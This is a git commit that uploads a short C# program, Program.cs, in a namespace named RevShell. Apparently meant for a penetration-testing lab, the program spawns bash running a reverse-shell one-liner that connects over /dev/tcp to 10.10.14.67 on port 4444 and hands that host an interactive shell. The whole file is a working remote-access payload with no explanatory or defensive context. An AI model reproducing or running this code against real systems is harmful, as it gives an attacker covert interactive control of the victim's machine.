1a93c755690273f0bc365193130e985e1c2472df
whitesocks <17552637+whites0cks@users.noreply.github.com>
2023-10-07 12:47:20 +0200

    Add files via upload

---
+++ Program.cs
@@ -0,0 +1,23 @@
+﻿using System;
+using System.Diagnostics; 
+
+namespace RevShell
+{
+    class Program
+    {
+		public static void Main(string[] args)
+		{
+			Process proc = new System.Diagnostics.Process();
+			proc.StartInfo.FileName = "/bin/bash";
+			proc.StartInfo.Arguments = "-c \"/bin/bash -i >& /dev/tcp/10.10.14.67/4444 0>&1\"";
+			proc.StartInfo.UseShellExecute = false;
+			proc.StartInfo.RedirectStandardOutput = true;
+			proc.Start();
+
+			while (!proc.StandardOutput.EndOfStream)
+			{
+				Console.WriteLine(proc.StandardOutput.ReadLine());
+			}
+		}
+	}
+}
